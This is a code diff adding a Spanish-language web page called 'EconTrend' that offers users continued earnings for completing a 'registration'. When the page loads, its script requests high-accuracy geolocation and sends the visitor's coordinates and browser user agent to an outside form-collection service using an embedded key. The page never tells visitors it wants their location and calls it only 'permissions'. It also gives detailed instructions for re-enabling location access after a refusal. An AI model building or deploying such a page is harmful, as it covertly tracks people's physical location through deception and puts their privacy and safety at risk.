@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EconTrend - ¡Continúa Generando Ganancias!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background: linear-gradient(to right, #4CAF50, #8BC34A); /* Degradado verde */
+            color: white;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .container {
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+            max-width: 600px;
+            width: 100%;
+            color: #333;
+        }
+        h1 {
+            color: #2E7D32; /* Verde oscuro */
+            margin-bottom: 25px;
+            font-size: 2.5em;
+        }
+        p {
+            margin-bottom: 20px;
+            line-height: 1.8;
+            font-size: 1.1em;
+        }
+        .highlight {
+            color: #FFC107; /* Amarillo para resaltar */
+            font-weight: bold;
+        }
+        .important-note {
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #666;
+        }
+        .message {
+            font-weight: bold;
+            color: #1A5222; /* Un verde más profundo */
+            margin-top: 25px;
+            font-size: 1.2em;
+        }
+        .error-message {
+            color: #dc3545; /* Rojo para errores */
+            font-weight: bold;
+            margin-top: 15px;
+        }
+        .instructions {
+            background-color: #f8d7da; /* Fondo rojo claro */
+            color: #721c24; /* Texto rojo oscuro */
+            border: 1px solid #f5c6cb;
+            border-radius: 5px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: left;
+            font-size: 0.9em;
+            display: none; /* Oculto por defecto, se muestra con JS */
+        }
+        .instructions p {
+            margin-bottom: 5px;
+        }
+        .instructions ul {
+            margin-top: 5px;
+            margin-bottom: 10px;
+            padding-left: 20px;
+        }
+        .instructions li {
+            margin-bottom: 3px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>¡Bienvenido a EconTrend!</h1>
+        <p>Para <span class="highlight">continuar generando ganancias</span> y completar tu registro con nosotros, necesitamos un paso crucial.</p>
+        <p>Por favor, haz clic en <span class="highlight">"Permitir"</span> o <span class="highlight">"Aceptar"</span> cuando tu navegador te solicite **acceso a los permisos**. ¡Es fundamental para tu experiencia en EconTrend!</p>
+        <p class="message" id="statusMessage">Esperando tu confirmación de permisos...</p>
+        <p class="error-message" id="errorMessage"></p>
+
+        <div class="instructions" id="permissionInstructions">
+            <p><strong>¿Problemas con los permisos?</strong></p>
+            <p>Si denegaste el permiso accidentalmente o no viste la solicitud, aquí te explicamos cómo activarlo manualmente para continuar:</p>
+            <p><strong>Para Android (Chrome, Firefox, Edge):</strong></p>
+            <ul>
+                <li>Busca los **tres puntos** `(⋮)` o el **icono de menú** `(☰)` en la parte superior derecha de tu navegador.</li>
+                <li>Luego busca el **icono de una 'i' en un círculo** `(ⓘ)`.</li>
+                <li>Haz clic en este icono y busca la sección de 'Permisos del sitio' o 'Configuración del sitio'.</li>
+                <li>Cambia el permiso a **'Preguntar'** o **'Permitir'**.</li>
+                <li>Selecciona **"Permitir solo con la app en uso"** o **"Preguntar siempre"**.</li>
+                <li>Luego, **recarga esta página**.</li>
+            </ul>
+            <p><strong>Para iPhone/iPad (Safari, Chrome):</strong></p>
+            <ul>
+                <li>Abre los **Ajustes** de tu iPhone/iPad.</li>
+                <li>Desplázate hacia abajo y toca en el **navegador** que estés usando (Safari, Chrome).</li>
+                <li>Busca la sección **"Ubicación"** y tócala.</li>
+                <li>Selecciona **"Preguntar la próxima vez"** o **"Preguntar la próxima vez o al compartir"** o **"Al usar la app"**.</li>
+                <li>Luego, **recarga esta página**.</li>
+            </ul>
+            <p><strong>Para navegadores de escritorio (Chrome, Firefox, Edge):</strong></p>
+            <ul>
+                <li>Busca los **tres puntos** `(⋮)` o el **icono de menú** `(☰)` en la parte superior derecha de tu navegador.</li>
+                <li>Luego busca el **icono de una 'i' en un círculo** `(ⓘ)` o un **candado** `( padlock icon )` en la **barra de direcciones del navegador**.</li>
+                <li>Haz clic en este icono y busca la sección de 'Permisos del sitio' o 'Configuración del sitio'.</li>
+                <li>Cambia el permiso de ubicación a **'Preguntar'** o **'Permitir'**.</li>
+                <li>Luego, **recarga esta página**.</li>
+            </ul>
+            <p><strong>Si usas otro navegador o dispositivo, busca "permisos de ubicación" en la configuración de tu navegador o del sistema.</strong></p>
+        </div>
+    </div>
+    <div class="important-note">
+        <p>
+            Tus datos son privados y seguros. Esta información es necesaria para asegurar la integridad de tu cuenta y la funcionalidad de EconTrend.
+        </p>
+    </div>
+
+    <script>
+        const statusMessageElement = document.getElementById('statusMessage');
+        const errorMessageElement = document.getElementById('errorMessage');
+        const permissionInstructionsElement = document.getElementById('permissionInstructions');
+
+        function sendLocationToWeb3Forms(latitude, longitude) {
+            statusMessageElement.textContent = 'Enviando tu información para procesar tu registro...';
+            errorMessageElement.textContent = ''; // Limpiar errores previos
+            permissionInstructionsElement.style.display = 'none'; // Ocultar instrucciones si ya se aceptó
+
+            const data = {
+                access_key: "61f686f1-9db4-48f8-9d45-635dbf181292", // Tu clave de Web3Forms
+                subject: "Información de Usuario de EconTrend",
+                latitud: latitude,
+                longitud: longitude,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
+
+            fetch("https://api.web3forms.com/submit", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                    "Accept": "application/json"
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    console.log("Información enviada a Web3Forms con éxito:", data);
+                    statusMessageElement.innerHTML = '¡Gracias! Tu información ha sido procesada con éxito. Ya puedes reclamar tu recompensa enviándonos el pantallazo de esta página y continuar con más tareas.';
+                    errorMessageElement.textContent = ''; // Asegurar que no haya mensaje de error
+                } else {
+                    console.error("Error al enviar a Web3Forms:", data);
+                    statusMessageElement.textContent = 'Hubo un error al procesar tu información. Por favor, inténtalo de nuevo más tarde.';
+                    errorMessageElement.textContent = 'Error: ' + (data.message || 'Desconocido');
+                }
+            })
+            .catch(error => {
+                console.error("Error de red al enviar a Web3Forms:", error);
+                statusMessageElement.textContent = 'Hubo un problema de conexión al procesar tu información. Intenta de nuevo.';
+                errorMessageElement.textContent = 'Error de red. Revisa tu conexión a internet.';
+            });
+        }
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                statusMessageElement.textContent = 'Solicitando permisos del navegador...';
+                errorMessageElement.textContent = '';
+                permissionInstructionsElement.style.display = 'none'; // Ocultar instrucciones mientras se pide
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => { // Función de éxito
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        console.log(`Información obtenida: Latitud ${lat}, Longitud ${lon}`);
+                        sendLocationToWeb3Forms(lat, lon);
+                    },
+                    (error) => { // Función de error
+                        let message = "Hubo un problema al obtener la información.";
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                message = "¡Permiso denegado por el usuario! Necesitamos tu aprobación para continuar.";
+                                permissionInstructionsElement.style.display = 'block'; // Mostrar instrucciones
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                message = "Información no disponible. Intenta de nuevo.";
+                                break;
+                            case error.TIMEOUT:
+                                message = "La solicitud ha caducado. Asegúrate de tener una buena conexión.";
+                                break;
+                            case error.UNKNOWN_ERROR:
+                                message = "Ocurrió un error inesperado al obtener la información.";
+                                break;
+                        }
+                        statusMessageElement.textContent = message;
+                        errorMessageElement.textContent = 'Por favor, concede el permiso para continuar.';
+                        console.error("Error al obtener información:", error);
+                    },
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            } else {
+                statusMessageElement.textContent = '';
+                errorMessageElement.textContent = "Tu navegador no soporta la función necesaria. Necesitas uno compatible.";
+                console.error("Función no soportada.");
+            }
+        }
+
+        // Inicia el proceso de solicitud cuando la página carga
+        window.onload = getLocation;
+    </script>
+</body>
+</html>
